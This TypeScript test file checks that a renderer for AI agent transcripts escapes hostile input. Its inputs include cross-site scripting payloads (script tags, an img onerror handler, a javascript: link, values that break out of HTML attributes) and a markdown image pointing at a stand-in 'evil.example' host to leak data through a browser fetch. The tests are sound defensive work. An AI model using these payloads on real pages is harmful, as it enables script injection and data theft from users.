import assert from "node:assert/strict";
import { test } from "node:test";
import { md, renderAssistant, renderEntry } from "./render.ts";

test("model markdown cannot inject markup or make the browser fetch", () => {
	assert.equal(md("<script>alert(1)</script>").includes("<script"), false);
	assert.equal(md("hi <img src=x onerror=alert(1)>").includes("<img"), false);
	assert.equal(md("[x](javascript:alert(1))").includes("href"), false);
	assert.equal(md("![x](https://evil.example/?leak)").includes("<img"), false);
	assert.match(md("[ok](https://example.com)"), /<a href="https:\/\/example.com">ok<\/a>/);
});

test("a skill sent with /skill: is folded, and its text escaped", () => {
	const content = '<skill name="x<b>" location="/s">\n<script>\n</skill>\n\nhello';
	const entry = { id: 1, kind: "pi.user", model: [{ role: "user", content }] } as never;
	const html = renderEntry(entry);
	assert.match(html, /<summary>skill x&#60;b&#62;<\/summary>/);
	assert.match(html, /<div class="text">hello<\/div>/);
	assert.equal(html.includes("<script"), false);
});

test("code blocks are highlighted, unknown languages escaped", () => {
	assert.match(md("```js\nconst a = 1;\n```"), /<span class="hljs-keyword">const<\/span>/);
	assert.match(md("```nope\n<b>\n```"), /&#60;b&#62;/);
});

test("images in messages are shown inline, their fields escaped", () => {
	const content = [{ type: "image", mimeType: 'image/png"><script>', data: "AAAA" }];
	const html = renderEntry({ id: 1, kind: "pi.tool-result", model: [{ role: "toolResult", toolName: "read", toolCallId: "c1", content }] } as never);
	assert.match(html, /<img src="data:image\/png&#34;&#62;&#60;script&#62;;base64,AAAA" alt="Image the agent read">/);
	assert.equal(html.includes("<script"), false);
});

test("tool calls show their arguments unwrapped, results their output without <harness>, all escaped", () => {
	const call = { type: "toolCall", id: 'x"><b>', name: "bash", arguments: { command: 'echo "<b>"\nls' } };
	const html = renderAssistant({ content: [{ type: "text", text: 'say "<b>"' }, call] } as never);
	assert.match(html, /data-call="x&#34;&#62;&#60;b&#62;"/);
	assert.match(html, /<pre>echo &#34;&#60;b&#62;&#34;\nls<\/pre>/);
	assert.match(html, /<button class="copy" type="button" title="Copy" data-md="say &#34;&#60;b&#62;&#34;">/);
	assert.equal(html.includes("<b>"), false);
	const content = [{ type: "text", text: "out\n<harness>\n[error] exit 1\n</harness>" }];
	const result = renderEntry({ id: 2, kind: "pi.tool-result", model: [{ role: "toolResult", toolName: "bash", toolCallId: "c", isError: true, content }] } as never);
	assert.match(result, /<pre>out\n\[error\] exit 1<\/pre>/);
	assert.match(result, /<span class="outcome error">failed, 2 lines<\/span>/);
});
